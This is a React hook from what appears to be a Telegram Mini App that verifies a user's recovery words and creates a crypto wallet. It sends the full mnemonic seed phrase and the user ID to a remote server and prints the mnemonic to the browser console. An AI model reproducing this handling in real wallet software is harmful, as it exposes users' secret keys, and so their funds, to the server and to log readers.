import  { useCallback, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import BackButton from '../../../constants/BackButton';
import MainButton from '../../../constants/MainButton';
import axios from 'axios';
import { useDispatch } from 'react-redux';
import { fetchUserInfo } from '../../../store/telegramUserInfo';
import translation from '../../../functions/translate';

const useButton = ({step, setStep, keys, values, setMistakes, mistakes, numbers}) => {
    
    const navigate = useNavigate()

    useEffect( () => {
        const mistakesCopy = [false, false, false ,false ,false, false]
        

        if (mistakes.includes(true)){
            numbers.forEach((e, i) => {
                if (keys[e - 1] !== values[i]){
                    mistakesCopy[i] = true
                }
            })
            if (mistakesCopy.join(" ") !== mistakes.join(' ')){
                setMistakes(mistakesCopy)
            }
        }
        console.log(keys);
        
        console.log(values);
        console.log(mistakes);
        console.log(mistakesCopy);
        console.log(numbers);
        
        
        
        


    } , [values, mistakes, keys, numbers, setMistakes] )
    

    const dispatch = useDispatch()

    const backFunction = useCallback( () => {
        if (step){
          setStep(0)
        }
        else{
          navigate(-1)
        }
      } , [step, navigate, setStep] )
    
      
      useEffect( () => {
        BackButton.show()
        BackButton.onClick(backFunction)
        return () => {
          BackButton.offClick(backFunction)
        }
      } , [backFunction])
    
    
    
      const checkFunction = useCallback( () => {
          const mistakesCopy = [false, false, false, false, false, false]
          numbers.forEach((e, i) => {
            if (keys[e - 1] !== values[i]){
                mistakesCopy[i] = true
            }
        })
          setMistakes(mistakesCopy)
          return mistakesCopy.every(e => !e)
      }, [keys, values, setMistakes, numbers ] )


      const createWallet = useCallback( async () => {
        await axios.post("https://www.connectbirga.ru/user/wallet", {
            mnemonic: keys.map(e => e.trim()),
            userId: window.Telegram.WebApp.initDataUnsafe.user.id,
          } , {
            headers : {
              "X-API-KEY-AUTH" : process.env.REACT_APP_API_KEY
            }
          });
      } , [keys] )
    
      const saveFunction = useCallback( () => {
          if (checkFunction()){
            createWallet().then(value => {
                dispatch(fetchUserInfo()).then(value => 
                  navigate("/Wallet")
                )
            })
            .catch(value => {
                alert("Кошелек не был создан, причина : " + JSON.stringify(value))
                console.log(value)
            })
          }
          else{
            window.Telegram.WebApp.HapticFeedback.notificationOccurred("error")
          }
      } , [checkFunction, dispatch, createWallet, navigate] )
    

      useEffect( () => {
    
    
        const forwardFunction = () => {
          if (step === 0){
            setStep((value) => (value + 1))
          }
          else{
            saveFunction()
          }
        }
    
        
        if (step === 0){
          MainButton.setText(translation("ПРОДОЛЖИТЬ"))
        }
        else{
          MainButton.setText(translation("СОЗДАТЬ КОШЕЛЕК"))
        }
        

        MainButton.onClick(forwardFunction)
        return () => {
          MainButton.offClick(forwardFunction)
        }
      } , [step, saveFunction, setStep] )

    
};

export default useButton;